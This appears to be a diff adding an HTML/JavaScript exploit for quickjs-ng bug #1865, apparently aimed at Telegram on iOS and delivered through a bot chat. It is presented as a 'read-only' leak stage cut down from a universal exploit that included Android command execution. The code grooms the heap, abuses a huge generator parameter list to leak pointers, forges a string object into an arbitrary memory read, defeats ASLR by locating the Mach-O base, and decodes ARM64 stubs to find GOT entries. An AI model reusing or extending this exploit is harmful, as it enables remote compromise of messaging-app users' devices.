@@ -1,0 +1,95 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>1865 ios leak v1</title>
+<div id="w">1865 ios leak v1: start</div>
+<script>
+/* quickjs-ng #1865 - iOS leak-stage validation widget (READ-ONLY).
+ *
+ * Derived from widget_poc_1865_universal_v3.html with the Android endgame
+ * (findLibc/resolveSystem/system hook/cmd) removed. Everything here is
+ * read-only after the leak: no rt+16/rt+64 writes, no system, no exec.
+ *
+ * Purpose (assessment lab/1865_universal_port_assessment_20261107.md §4.1.2):
+ *   1. validate the 1 MB groom under iOS libmalloc (S1a/S1b V=..., off=...)
+ *   2. validate the frame reuse (S2 pv=... F=...; S2 NOFRAME = try 1.5/2 MiB)
+ *   3. read-only engine walk: curfunc/bcode/ctx/rt/js_free + Mach-O base
+ *      check (jsf - 0x3f4f174 -> 0xfeedfacf magic) + stub GOT decode
+ *      (expected GOT slot base+0x69091f8 -> free, per #1827 session).
+ *
+ * Markers: S0, S1a/S1b, S2, S2f, S3 ios, S3b got, ERR.
+ * Delivery: whitelisted bot chat (same endpoint as #1827 iOS payloads).
+ */
+(function () {
+  var W = document.getElementById('w');
+  var LOG = [];
+  function mark(s) {
+    LOG.push(s);
+    function paint() { try { W.textContent = LOG.join(' | '); } catch (e) {} }
+    paint();
+    try { requestAnimationFrame(paint); } catch (e) {}
+  }
+  try {
+mark('S0');
+/* two-direction groom + 48-byte padding prime (v3 inherited) */
+var E_S2="for(var d=-8192; d<=buf2.byteLength-BASEOFF-16; d+=8){ var o=BASEOFF+d; dv.setBigUint64(o,0x3ff3c0c9539b8887n,true); dv.setBigUint64(o+8,8n,true); var pr=f(); if(typeof pr==='number' && pr>1.2345 && pr<1.2346){ PVOFF=o; found=true; break; } } if(!found){ var szs=[1048576,1048960,1052672,1114112]; for(var si=0; si<szs.length && !found; si++){ buf2=new ArrayBuffer(szs[si]); dv=new DataView(buf2); for(var d=-8192; d<=buf2.byteLength-BASEOFF-16; d+=8){ var o=BASEOFF+d; dv.setBigUint64(o,0x3ff3c0c9539b8887n,true); dv.setBigUint64(o+8,8n,true); var pr=f(); if(typeof pr==='number' && pr>1.2345 && pr<1.2346){ PVOFF=o; found=true; break; } } } } globalThis.buf2=buf2; globalThis.dv=dv;";
+var params="x,".repeat(65533)+"y";
+eval("function* g("+params+"){ if (0) eval(''); var ps=[], us=[]; for (var i=0;i<16;i++){ var pp=new ArrayBuffer(48); ps.push(pp); var uu=new Uint8Array(pp); uu[0x14]=0x41; us.push(uu); } ps=null; us=null; var f=()=>y, a=0, b=0, c=0, d=0; yield f; }");
+var b0a=new ArrayBuffer(1048576); var va=new Uint8Array(b0a); va.fill(0);
+    globalThis.b0a=b0a; globalThis.va=va;
+var it=g();
+    globalThis.it=it;
+var b0b=new ArrayBuffer(1048576); var vb=new Uint8Array(b0b); vb.fill(0);
+    globalThis.b0b=b0b; globalThis.vb=vb;
+var f=it.next().value;
+    globalThis.f=f;
+function scan(v){ for (var i=0;i<v.length;i+=8){ var lo=(v[i]|(v[i+1]<<8)|(v[i+2]<<16)|(v[i+3]<<24))>>>0; var hi=(v[i+4]|(v[i+5]<<8)|(v[i+6]<<16)|(v[i+7]<<24))>>>0; if(lo||hi){ return [BigInt(hi)*4294967296n+BigInt(lo), i]; } } return [0n,-1]; }
+var a=scan(va), b=scan(vb);
+var V=a[0]||b[0], which=a[0]? 'a':'b';
+if (V===0n) { mark('S1 NOLEAK'); throw 'noleak'; }
+globalThis.V=V;
+mark('S1'+which+' V=0x'+V.toString(16)+' off='+(a[0]?a[1]:b[1]));
+it.next();
+var buf2=new ArrayBuffer(1048912);
+var dv=new DataView(buf2);
+    globalThis.buf2=buf2; globalThis.dv=dv;
+var BASEOFF=65533*16, PVOFF=BASEOFF, found=false;
+for (var d=-2048; d<=buf2.byteLength-BASEOFF-16; d+=8){ var o=BASEOFF+d; dv.setBigUint64(o,0x3ff3c0c9539b8887n,true); dv.setBigUint64(o+8,8n,true); var pr=f(); if (typeof pr==='number' && pr>1.2345 && pr<1.2346){ PVOFF=o; found=true; break; } }
+if (!found) { try { eval(E_S2); } catch(e) { mark('S2f ERR '+(e&&e.message?e.message:String(e))); } }
+if (!found) { mark('S2 NOFRAME'); throw 'noframe'; }
+var P=V+0x14n;
+dv.setBigUint64(PVOFF,P,true); dv.setBigUint64(PVOFF+8,0xfffffffffffffff7n,true);
+var big=f();
+var hs=big.toString(16);
+var neg=hs.charAt(0)==='-'; if(neg) hs=hs.slice(1);
+var mag=BigInt('0x'+(hs.length?hs:'0'));
+var raw=neg ? ((1n<<BigInt(32*0x41))-mag) : mag;
+var pv=raw & 0xFFFFFFFFFFFFFFFFn;
+var sf=(raw>>128n)&0xFFFFFFFFFFFFFFFFn;
+var F=pv-BigInt(PVOFF);
+mark('S2 pv=0x'+pv.toString(16)+' F=0x'+F.toString(16)+' off='+PVOFF+' hl='+hs.length);
+var STR=0xfffffffffffffff9n;
+dv.setUint32(0x100,0x400,true); dv.setUint32(0x104,0x20000000,true); dv.setUint32(0x108,0,true); dv.setUint32(0x10C,0,true);
+dv.setBigUint64(0x110,0n,true); dv.setBigUint64(0x118,0n,true); dv.setUint32(0xFC,0x10000,true);
+dv.setBigUint64(PVOFF,F+0x100n,true); dv.setBigUint64(PVOFF+8,STR,true);
+var reader=f();
+    globalThis.reader=reader;
+function rd(ad,n){ dv.setBigUint64(0x118,ad,true); var s=''; for(var i=0;i<n;i++){ var bb=reader.charCodeAt(i); if(bb>255)bb&=255; s+=('0'+bb.toString(16)).slice(-2);} return s; }
+function rdq(ad){ var s=rd(ad,8), r=0n; for(var i=7;i>=0;i--){ r=(r<<8n)|BigInt(parseInt(s.slice(i*2,i*2+2),16)); } return r; }
+function rd32(ad){ var s=rd(ad,4); return parseInt(s.slice(6,8)+s.slice(4,6)+s.slice(2,4)+s.slice(0,2),16)>>>0; }
+function rd16(ad){ var s=rd(ad,2); return parseInt(s.slice(2,4)+s.slice(0,2),16)>>>0; }
+var curfunc=rdq(sf+8n), bcode=rdq(curfunc+0x30n), ctx=rdq(bcode+0x48n), rt=rdq(ctx+16n), jsf=rdq(rt+16n);
+mark('S3 ios ctx=0x'+ctx.toString(16)+' rt=0x'+rt.toString(16)+' jsf=0x'+jsf.toString(16));
+/* iOS 13.2/36535 base check: JS_DEF_FREE = 0x3f4f174 (TelegramUIFramework) */
+var baseI=jsf-0x3f4f174n;
+var magicI=rd32(baseI);
+mark('S3b ios base=0x'+baseI.toString(16)+' magic=0x'+magicI.toString(16));
+/* stub decode (read-only): js_def_free = mov x0,x1; b ...; thunk adrp/ldr -> GOT */
+try { eval("function adrpPage(pc,ins){ var immlo=(ins>>>29)&3, immhi=(ins>>>5)&0x7FFFF; var imm=(immhi<<2)|immlo; if(imm&0x100000) imm-=0x200000; return (pc & ~0xFFFn) + BigInt(imm)*4096n; } function gotAt(pc,depth){ var page=0n, reg=-1; for(var k=0;k<depth;k++){ var aa=pc+BigInt(k*4), ins=rd32(aa); if(ins===0xD503245F||ins===0xD503201F||ins===0xD503249F) continue; if(((ins&0x9F000000)>>>0)===0x90000000){ page=adrpPage(aa,ins); reg=ins&31; } else if(((ins&0xFFC00000)>>>0)===0xF9400000){ var rn=(ins>>>5)&31, imm12=(ins>>>10)&0xFFF; if(rn===reg) return page + BigInt(imm12*8); } } return 0n; } function pltGot(pc){ for(var k=0;k<16;k++){ var aa=pc+BigInt(k*4), ins=rd32(aa); if(ins===0xD503245F||ins===0xD503201F) continue; var op=ins&0xFC000000; if(op===0x14000000||op===0x94000000){ var imm=ins&0x03FFFFFF; if(imm&0x02000000) imm-=0x04000000; var t=aa+BigInt(imm)*4n; var t0=rd32(t); if(t0===0xD503245F) t0=rd32(t+4n); if(((t0&0x9F000000)>>>0)===0x90000000){ var got=gotAt(t,8); if(got) return got; } } } return gotAt(pc,10); } var gg=pltGot(jsf); if(gg){ var fa=rdq(gg); mark('S3c got=0x'+gg.toString(16)+' -> 0x'+fa.toString(16)); } else { mark('S3c got NONE'); }"); } catch(e) { mark('S3c ERR '+(e&&e.message?e.message:String(e))); }
+mark('S4 leak-stage complete (read-only)');
+throw 'ios-leak-done';
+  } catch (e) {
+    mark('ERR ' + (e && e.message ? e.message : String(e)));
+  }
+})();
+
+</script>
